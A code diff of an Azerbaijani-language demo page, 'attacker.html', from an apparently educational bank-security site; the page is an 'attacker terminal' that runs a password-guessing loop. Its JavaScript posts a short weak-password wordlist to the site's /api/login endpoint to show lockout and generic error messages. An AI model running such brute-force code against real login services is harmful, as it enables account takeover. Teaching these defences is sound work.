@@ -1,3 +1,20 @@
+<!--
+  attacker.html — HÜCUMÇU TERMİNALI (bankın özünə aid DEYİL)
+  ===========================================================
+  Bu səhifə, bank saytının bir hissəsi kimi GÖRÜNMƏMƏK üçün bilərəkdən
+  tamam fərqli dizayndadır (qara fon, yaşıl mətn — "hacker terminal" effekti).
+
+  NECƏ İŞLƏYİR: "brute-force başlat" düyməsinə basanda, aşağıdakı JavaScript
+  kodu HƏQİQİ /api/login ünvanına, bir-bir, siyahıdakı zəif parolları
+  göndərir (fetch() ilə). Yəni bu, saxta bir animasiya deyil — bank
+  backend-i bu sorğuları əsl giriş cəhdi kimi qəbul edir.
+
+  VACİB TƏHLÜKƏSİZLİK PRİNSİPİ: bu ekranda yalnız HÜCUMÇUNUN görə biləcəyi
+  qədər məlumat göstərilir (sadə "401 Unauthorized" və ya "403 Forbidden").
+  Serverin daxili prosesini izah edən ətraflı "trace" burada göstərilmir —
+  o, yalnız bankın öz işçi panelində görünür. Real bir sistem də elə
+  belə davranmalıdır: xaricə az məlumat, daxildə tam qeyd.
+-->
 <!doctype html><html lang="az"><head><meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>externalhost:~# — brute-force terminalı</title>
@@ -28,40 +45,53 @@
   kimi qəbul edir. Fərq: burada yalnız <b>hücumçunun görə biləcəyi</b> cavab göstərilir (generic xəta), bankın öz
   <a href="/staff" style="color:#8FA">işçi panelində</a> isə hadisə tam təfərrüatı ilə qeydə alınır.</div>
 
-  <div class="target">hədəf: <input id="uname" value="orxan"> &nbsp; portal: customer &nbsp;
+  <!--
+    DÜZƏLİŞ: köhnə "orxan" sərt-kodlaşdırılmış dəyəri silindi (artıq belə
+    istifadəçi yoxdur). İndi xana boşdur, demo zamanı istənilən mövcud
+    müştəri adını (huseyn, zahid, nicat, adil) özün yazırsan.
+  -->
+  <div class="target">hədəf: <input id="uname" placeholder="məs: zahid"> &nbsp; portal: customer &nbsp;
   <button id="go">brute-force başlat</button></div>
 
   <div id="term">root@kali:~# nc InnTech-Bank hazırlanır…
 </div>
 </main>
 <script>
+// Hücumçunun sınayacağı zəif parollar siyahısı (real dünyada "wordlist" adlanır)
 const wordlist=["123456","password","qwerty","admin123","orxan2000","iloveyou","letmein"];
 const term=document.getElementById('term'), go=document.getElementById('go');
 const esc=s=>s.replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));
 function line(t,cls){term.innerHTML+='\\n'+(cls?('<span class="'+cls+'">'+esc(t)+'</span>'):esc(t));term.scrollTop=term.scrollHeight}
 
 go.addEventListener('click', async ()=>{
-  go.disabled=true;
   const user=document.getElementById('uname').value.trim();
+  // DÜZƏLİŞ: xana boş olanda xəbərdarlıq edir, boş sorğu göndərmir
+  if(!user){ line('[!] Hədəf istifadəçi adı yazılmayıb.','warn'); return; }
+  go.disabled=true;
   term.innerHTML='root@kali:~# python3 brute_force.py --target inntech-bank --user '+esc(user)+' --wordlist rockyou_top7.txt';
   line('[*] Hücum başladı, '+wordlist.length+' parol sınanacaq…','dim');
   let stopped=false;
+  // Hər parolu BİR-BİR, HƏQİQİ /api/login ünvanına göndərir (fetch)
   for(let i=0;i<wordlist.length && !stopped;i++){
     const pw=wordlist[i];
     const fd=new FormData(); fd.append('username',user); fd.append('password',pw); fd.append('portal','customer');
     let d;
     try{ const r=await fetch('/api/login',{method:'POST',body:fd}); d=await r.json(); }
     catch(e){ line('[!] Şəbəkə xətası','bad'); break; }
-    await new Promise(ok=>setTimeout(ok,550));
+    await new Promise(ok=>setTimeout(ok,550));   // real hücum effekti üçün kiçik gözləmə
     if(d.ok){
+      // Nəzəri hal: əgər parol doğru çıxsaydı (bizim demoda baş vermir, çünki
+      // doğru parol siyahıda yoxdur)
       line(`[${i+1}/${wordlist.length}] "${pw}"  ->  200 OK — giriş uğurlu oldu!`,'bad');
       line('[!] PAROL TAPILDI, hücum uğurlu oldu','bad'); stopped=true; break;
     }
     if(/blokl/i.test(d.error||'')){
+      // Server "Hesab bloklanıb" cavabı verəndə hücum dayandırılır
       line(`[${i+1}/${wordlist.length}] "${pw}"  ->  403 Forbidden — "${d.error}"`,'warn');
       line('[x] Hədəf tərəfindən əlaqə kəsildi (hesab bloklanıb). Hücum dayandırıldı.','warn');
       stopped=true; break;
     }
+    // Adi yanlış parol cavabı
     line(`[${i+1}/${wordlist.length}] "${pw}"  ->  401 Unauthorized — "${d.error}"`,'bad');
   }
   if(!stopped) line('[*] Siyahı tükəndi, hədəf sındırılmadı.','dim');
